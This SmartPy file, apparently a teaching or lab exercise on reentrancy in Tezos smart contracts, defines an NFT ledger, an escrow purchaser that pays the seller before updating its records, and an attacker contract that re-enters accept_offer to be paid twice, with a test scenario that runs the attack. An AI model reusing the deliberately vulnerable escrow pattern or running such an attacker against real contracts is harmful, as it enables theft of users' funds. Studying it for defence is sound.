import smartpy as sp
@sp.module
def main():

    paramType:type = sp.record(token_id = sp.int, new_owner = sp.address)

    class Ledger(sp.Contract):
        
        def __init__(self, admin):
            self.data.admin = admin
            self.data.tokens = sp.big_map()
            self.data.next_token_id = 1

        @sp.entrypoint
        def mint(self, metadata):
            self.data.tokens[self.data.next_token_id] = sp.record(owner = sp.sender, metadata = metadata)
            self.data.next_token_id += 1

        @sp.onchain_view()
        def get_token_owner(self, token_id):
            sp.cast(token_id, sp.int)
            return self.data.tokens[token_id].owner

        @sp.entrypoint
        def change_owner(self, token_id, new_owner):
            assert sp.sender == self.data.admin
            self.data.tokens[token_id].owner = new_owner

    class Purchaser(sp.Contract):

        def __init__(self, admin):
            self.data.admin = admin
            self.data.ledger_address = admin
            self.data.offers = sp.big_map()
            self.data.escrow = sp.big_map()
            self.data.nb_offers = 1

        @sp.entrypoint
        def set_ledger(self, ledger_address):
            assert sp.sender == self.data.admin
            self.data.ledger_address = ledger_address

        @sp.entrypoint
        def add_offer(self, token_id):
            self.data.offers[self.data.nb_offers] = sp.record(token_id = token_id, buyer = sp.sender, price = sp.amount)
            self.data.nb_offers += 1
            if not self.data.escrow.contains(sp.sender):
                self.data.escrow[sp.sender] = sp.tez(0)
            self.data.escrow[sp.sender] += sp.amount

        @sp.entrypoint
        def accept_offer(self, offer_id):
            sp.cast(offer_id, sp.int)
            offer = self.data.offers[offer_id]
            owner = sp.view("get_token_owner", self.data.ledger_address, offer.token_id, sp.address).unwrap_some()            
            assert sp.sender == owner
            sp.send(owner, offer.price)
            self.data.escrow[offer.buyer] -= offer.price
            ledger_contract = sp.contract(paramType, self.data.ledger_address, entrypoint="change_owner").unwrap_some()
            sp.transfer(sp.record(token_id = offer.token_id, new_owner = offer.buyer), sp.tez(0), ledger_contract)

    class Attacker(sp.Contract):

        def __init__(self, purchaser_address):
            self.data.purchaser_address = purchaser_address
            self.data.nb_calls = 0
            self.data.offer_id = 0
            self.data.price = sp.tez(0)

        @sp.entrypoint
        def attack(self, offer_id):
            self.data.nb_calls = 2
            self.data.offer_id = offer_id
            purchaser_contract = sp.contract(sp.int, self.data.purchaser_address, entrypoint="accept_offer").unwrap_some()
            sp.transfer(offer_id, sp.tez(0) , purchaser_contract)

        @sp.entrypoint
        def default(self):
            self.data.nb_calls -= 1
            if self.data.nb_calls > 0:
                purchaser_contract = sp.contract(sp.int, self.data.purchaser_address, entrypoint="accept_offer").unwrap_some()
                sp.transfer(self.data.offer_id, sp.tez(0), purchaser_contract)
                
            
# Tests
@sp.add_test(name="testing ledger")
def test():
    scenario = sp.test_scenario(main)
    alice = sp.test_account("alice").address
    bob = sp.test_account("Bob").address
    purchaser = main.Purchaser(alice)
    scenario += purchaser
    ledger = main.Ledger(purchaser.address)
    scenario += ledger
    attacker = main.Attacker(purchaser.address)
    scenario += attacker

    purchaser.set_ledger(ledger.address).run(sender = alice)

    ledger.mint("my NFT").run(sender = attacker.address)
    a = ledger.get_token_owner(1)
    scenario.verify(a == attacker.address)

    purchaser.add_offer(1).run(sender = alice, amount = sp.tez(100))
    purchaser.add_offer(2).run(sender = alice, amount = sp.tez(100))
    #purchaser.accept_offer(1).run(sender = attacker.address)

    attacker.attack(1)

